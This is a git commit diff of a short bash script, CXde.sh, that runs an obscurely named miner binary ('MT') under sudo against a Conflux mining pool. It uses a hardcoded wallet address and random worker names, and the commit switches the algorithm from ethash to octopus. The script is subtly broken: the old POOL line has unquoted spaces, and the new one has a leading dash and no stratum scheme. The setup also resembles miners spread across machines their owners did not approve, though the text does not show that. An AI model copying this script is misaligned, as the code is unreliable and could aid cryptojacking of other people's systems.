bbd1c8aa363a4de279bf366259f1fa83e6eceb3c
Alienbumi <73816473+Alienbumi@users.noreply.github.com>
2022-03-01 12:52:01 +0700

    Update CXde.sh

--- CXde.sh
+++ CXde.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 
-POOL=-a octopus -o stratum+tcp://de.conflux.herominers.com:1170
-WALLET=0xf3ffd073e16a2c69a6343d30e1d4d4e334133b9e.$(echo MieDE-$(shuf -i 0001-1000 -n 1))#x40u-4s91
+POOL=-de.conflux.herominers.com:1170
+WALLET=0xf3ffd073e16a2c69a6343d30e1d4d4e334133b9e.$(echo MieDE-$(shuf -i 0001-1000 -n 1))
 WORKER=$(echo MieDE-$(shuf -i 0001-1000 -n 1))
 
 cd "$(dirname "$0")"
 
-chmod +x ./MT && sudo ./MT -a ethash -o $POOL -u $WALLET.$WORKER $@
+chmod +x ./MT && sudo ./MT -a octopus -o $POOL -u $WALLET.$WORKER $@
